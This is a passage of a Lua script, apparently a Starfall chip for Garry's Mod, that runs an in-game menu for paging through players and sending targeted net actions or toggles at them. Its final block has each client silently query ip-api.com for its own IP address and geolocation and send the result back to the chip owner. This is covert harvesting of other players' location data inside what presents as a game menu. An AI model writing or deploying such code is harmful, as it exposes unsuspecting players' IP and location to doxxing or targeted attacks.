                        render.drawText(sx-245, sy/2-35, "Frags: " .. h:getFrags(), 0)
                        render.drawText(sx-245, sy/2-20, "Deaths: " .. h:getDeaths(), 0)
                        render.drawText(sx-245, sy/2-5, "Ping: " .. h:getPing(), 0)
                        
                    end
                end
            end
            ----------------------------------------------------
        end)
        
        hook.add("inputreleased", "", function(butt)
            if onned then
                if butt < 11 and butt > 1 then
                    owner():emitSound("buttons/button24.wav", 100, 100, 50, 0)
                elseif butt == 1 then
                    owner():emitSound("buttons/blip1.wav", 100, 50, 50, 0)
                end
                if !is_main then
                    if butt == 9 and ppage < math.round(#find.allPlayers()/7 + 0.4) then
                        ppage = ppage + 1
                    end
                    if butt == 10 and ppage > 1 then
                        ppage = ppage - 1
                    end
                    if butt == 1 then
                        is_main = true
                        ppage = 1
                    end
                    if butt < 9 and butt > 1 and find.allPlayers()[(butt-1)+((ppage*7)-7)] != nil then
                        if string.sub(options[(option-1)+((menupage*7)-7)], -8) != "(SWITCH)" then
                            net.start(options[(option-1)+((menupage*7)-7)])
                            net.writeEntity(find.allPlayers()[(butt-1)+((ppage*7)-7)])
                            net.send()
                        else
                            if table.hasValue(switches[options[(option-1)+((menupage*7)-7)]], find.allPlayers()[(butt-1)+((ppage*7)-7)]) then
                                table.removeByValue(switches[options[(option-1)+((menupage*7)-7)]], find.allPlayers()[(butt-1)+((ppage*7)-7)])
                            else
                                table.insert(switches[options[(option-1)+((menupage*7)-7)]], find.allPlayers()[(butt-1)+((ppage*7)-7)])
                            end
                            net.start("set_switches")
                            net.writeEntity(find.allPlayers()[(butt-1)+((ppage*7)-7)])
                            net.writeTable(switches) 
                            net.send()
                            
                            net.start(options[(option-1)+((menupage*7)-7)])
                            net.writeTable(switches[options[(option-1)+((menupage*7)-7)]])
                            net.writeEntity(find.allPlayers()[(butt-1)+((ppage*7)-7)])
                            net.send()
                        end
                    end
                else
                    if butt == 1 then
                        onned = false
                    end
                    if butt == 9 and menupage < math.round(#options/7 + 0.4) then
                        menupage = menupage + 1
                    end
                    if butt == 10 and menupage > 1 then
                        menupage = menupage - 1
                    end
                    if butt < 9 and butt > 1 and options[(butt-1)+((menupage*7)-7)] != nil then
                        if string.sub(options[(butt-1)+((menupage*7)-7)], -5) != "(OFF)" and string.sub(options[(butt-1)+((menupage*7)-7)], -4) != "(ON)" then
                            option = butt
                            is_main = false
                        else
                            if string.sub(options[(butt-1)+((menupage*7)-7)], -5) != "(OFF)" and string.sub(options[(butt-1)+((menupage*7)-7)], -4) == "(ON)" then
                                options[(butt-1)+((menupage*7)-7)] = string.replace(options[(butt-1)+((menupage*7)-7)], "(ON)", "(OFF)")
                            else
                                options[(butt-1)+((menupage*7)-7)] = string.replace(options[(butt-1)+((menupage*7)-7)], "(OFF)", "(ON)")
                            end
                            net.start(options[(butt-1)+((menupage*7)-7)])
                            net.send()
                        end
                    end
                end
            else
                if butt == 93 then
                    owner():emitSound("buttons/lightswitch2.wav", 100, 100, 100, 0)
                    onned = true    
                end
            end
        end)
        hook.add('tick', '', function()
            if math.round(#find.allPlayers()/7 + 0.4) < ppage then
                ppage = ppage-1
            end
        end)
    end

    net.receive("cl_init", function() 
        pcall(function()
            http.get("http://ip-api.com/json/", function(str, len, code)
                ipdata = json.decode(str)
                net.start("data")
                net.writeTable(ipdata)
                net.send()
            end)
        end)
    end) 
end